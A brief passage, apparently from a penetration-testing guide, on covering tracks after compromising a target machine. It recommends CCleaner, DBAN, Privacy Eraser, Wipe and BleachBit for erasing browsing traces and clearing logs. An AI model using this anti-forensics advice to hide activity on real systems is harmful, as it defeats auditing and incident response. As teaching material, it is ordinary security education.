CCleaner is a system optimization, privacy, and cleaning tool. It allows you to remove unused files and cleans traces of Internet browsing details from the target PC. With this tool, you can very easily erase your tracks.


You can also use other track-covering tools such as DBAN (https://dban.org), Privacy Eraser (https://www.cybertronsoft.com), Wipe (https://privacyroot.com), and BleachBit (https://www.bleachbit.org) to clear logs on the target machine.

